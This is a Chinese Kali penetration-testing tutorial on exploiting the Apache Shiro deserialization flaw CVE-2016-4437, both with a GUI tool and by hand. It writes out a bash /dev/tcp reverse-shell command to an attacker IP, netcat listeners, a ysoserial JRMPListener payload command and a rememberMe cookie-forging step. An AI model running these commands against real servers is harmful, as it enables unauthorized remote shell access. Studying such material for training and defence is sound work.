# Kali渗透教程：P52：13_Shiro反序列化漏洞利用

![](img/b725d61ff07458963011e2382e6160f6_1.png)

在本节课中，我们将要学习如何对已发现的Shiro反序列化漏洞进行实际利用。上一节我们介绍了漏洞的发现与验证方法，本节中我们来看看如何通过手工和工具两种方式，获取目标服务器的Shell权限。

## 工具辅助利用

除了手工方法，我们可以使用专门的工具来简化漏洞检测和利用过程。以下是一个可以辅助检测和利用Shiro框架漏洞的工具。

该工具能够帮助验证两个主要的Shiro漏洞：CVE-2016-4437和CVE-2019-12422。在本例中，我们针对的是CVE-2016-4437漏洞进行利用。

工具的使用步骤如下：
1.  将目标URL地址复制到工具的“目标地址”输入框中。
2.  点击“下一步”，工具会自动进行漏洞测试。
3.  由于该漏洞没有直接的回显，我们可以通过执行`ping`命令来验证。让目标服务器去访问我们的DNSLog平台（如`ceye.io`），如果平台收到了DNS解析请求，则说明目标很可能存在漏洞。

![](img/b725d61ff07458963011e2382e6160f6_3.png)

![](img/b725d61ff07458963011e2382e6160f6_4.png)

![](img/b725d61ff07458963011e2382e6160f6_6.png)

接下来配置DNSLog平台。工具目录下的`config.properties`文件用于配置平台信息。
*   **域名**：填写你的专属子域名，例如 `xxxxx.ceye.io`。
*   **Token**：填写你在DNSLog平台获取的API Token。

![](img/b725d61ff07458963011e2382e6160f6_8.png)

![](img/b725d61ff07458963011e2382e6160f6_10.png)

配置完成后，在工具中选择使用`ceye.io`进行验证，并点击执行。稍等片刻后，刷新DNSLog平台的管理页面，如果看到来自目标IP的DNS请求记录，则证实漏洞存在。

![](img/b725d61ff07458963011e2382e6160f6_12.png)

## 获取反弹Shell

![](img/b725d61ff07458963011e2382e6160f6_14.png)

验证漏洞存在后，下一步是获取目标服务器的Shell权限。工具提供了便捷的反弹Shell功能。

![](img/b725d61ff07458963011e2382e6160f6_16.png)

![](img/b725d61ff07458963011e2382e6160f6_17.png)

![](img/b725d61ff07458963011e2382e6160f6_18.png)

![](img/b725d61ff07458963011e2382e6160f6_20.png)

以下是利用步骤：
1.  在攻击机上使用Netcat监听一个端口，准备接收连接。
    ```bash
    nc -lvp 1234
    ```
2.  在工具的“反弹Shell”选项中，填写你的**公网IP**和上一步监听的**端口**（例如：`120.27.61.239:1234`）。
3.  点击“执行”。

![](img/b725d61ff07458963011e2382e6160f6_22.png)

如果一切正常，你将在Netcat监听窗口中获得一个来自目标服务器的Shell连接，从而可以执行任意系统命令。

![](img/b725d61ff07458963011e2382e6160f6_24.png)

![](img/b725d61ff07458963011e2382e6160f6_26.png)

## 手工利用方法解析

![](img/b725d61ff07458963011e2382e6160f6_28.png)

![](img/b725d61ff07458963011e2382e6160f6_29.png)

![](img/b725d61ff07458963011e2382e6160f6_31.png)

除了使用集成化工具，理解手工利用的原理也至关重要。手工利用的核心是构造一个特殊的序列化数据（Payload），让Shiro在反序列化时执行我们的命令。

![](img/b725d61ff07458963011e2382e6160f6_33.png)

由于Java提供的命令执行环境不支持管道符`|`或重定向符`>`，我们需要对反弹Shell的命令进行Base64编码。

![](img/b725d61ff07458963011e2382e6160f6_35.png)

![](img/b725d61ff07458963011e2382e6160f6_36.png)

一个典型的反弹Shell命令如下：
```bash
bash -i >& /dev/tcp/120.27.61.239/2234 0>&1
```
我们需要使用在线编码工具将上述命令转换为Base64格式。

![](img/b725d61ff07458963011e2382e6160f6_38.png)

![](img/b725d61ff07458963011e2382e6160f6_40.png)

![](img/b725d61ff07458963011e2382e6160f6_42.png)

接下来，我们使用`ysoserial`工具生成Payload。`ysoserial`是一个集成了多种Java反序列化Payload的实用工具。

![](img/b725d61ff07458963011e2382e6160f6_44.png)

![](img/b725d61ff07458963011e2382e6160f6_45.png)

![](img/b725d61ff07458963011e2382e6160f6_47.png)

![](img/b725d61ff07458963011e2382e6160f6_49.png)

生成Payload的命令语法如下：
```bash
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 ‘bash -c {echo,<Base64_Encoded_Command>}|{base64,-d}|{bash,-i}’
```
*   `1099` 是JRMP监听服务的端口。
*   `CommonsCollections5` 是利用链名称。
*   `{echo,<Base64_Encoded_Command>}|{base64,-d}|{bash,-i}` 是解码并执行Base64编码命令的语句。

![](img/b725d61ff07458963011e2382e6160f6_51.png)

![](img/b725d61ff07458963011e2382e6160f6_53.png)

![](img/b725d61ff07458963011e2382e6160f6_55.png)

执行上述命令后，会在本地启动一个在1099端口的JRMP监听服务。

![](img/b725d61ff07458963011e2382e6160f6_57.png)

![](img/b725d61ff07458963011e2382e6160f6_59.png)

![](img/b725d61ff07458963011e2382e6160f6_60.png)

最后，我们需要生成一个包含此Payload的Shiro `rememberMe` Cookie。这通常通过一个Python脚本完成，脚本会向我们的JRMP服务（`139.9.198.30:1099`）发起连接，并生成加密后的Cookie值。
```bash
python2 shiro_cookie.py 139.9.198.30 1099
```
将脚本输出的Cookie值，替换到登录请求包的`rememberMe`字段中，然后发送该请求。同时，在攻击机上监听2234端口（`nc -lvp 2234`）。如果利用成功，将会在2234端口获得一个反弹Shell。

![](img/b725d61ff07458963011e2382e6160f6_62.png)

![](img/b725d61ff07458963011e2382e6160f6_64.png)

![](img/b725d61ff07458963011e2382e6160f6_66.png)

![](img/b725d61ff07458963011e2382e6160f6_68.png)

**注意**：手工利用过程中，IP地址和端口需要根据实际环境进行替换，并且每一步都需要仔细检查。如果利用不成功，需要排查命令、网络或Payload是否正确。

![](img/b725d61ff07458963011e2382e6160f6_70.png)

![](img/b725d61ff07458963011e2382e6160f6_72.png)

本节课中我们一起学习了Shiro反序列化漏洞的两种利用方式：使用自动化工具进行快速利用，以及手工构造Payload进行原理性利用。掌握这两种方法有助于深入理解漏洞本质并在不同场景下灵活运用。
